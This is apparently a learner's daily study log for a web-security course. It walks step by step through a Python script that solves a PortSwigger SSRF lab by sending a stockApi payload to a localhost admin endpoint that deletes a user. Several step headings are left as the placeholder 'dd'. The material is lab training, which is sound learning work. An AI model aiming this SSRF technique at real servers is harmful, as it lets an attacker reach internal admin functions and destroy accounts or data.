"Sometimes in life, you have to make a selfish decision and do what's best for you." - Saquon Barkley

# Day-14 Summary:

### Things Done Today:

- [X] Wreath Network:

- [X] SSRF Lab #1: [Web-Security Academy](https://portswigger.net/web-security/) -- PortSwigger; [Rana Khalil's Course](https://ranakhalil.teachable.com/);
   - Done with lab#1 today: It was pretty easy and understood the python code [Check out the full code in good format here], which I'm gonna tryna explain you people here below. 

1. Importing all the requests. Also disabling the warnings incase of not having the valid certificate.

```
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```
2. This thing is total optional, but inorder to check where you went wrong if the script doesn't work, this is real helpful thing to add onto the script.

```
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
```
3. dd

```
def delete_user(url):
    delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
```
4. dd

```
    # Check if user was deleted
    admin_ssrf_payload = 'http://localhost/admin'
    params2 = {'stockApi': admin_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    if 'User deleted successfully' in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful.")
```
5. dd

```
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)
```
6. dd

```
if __name__ == "__main__":
    main()
```
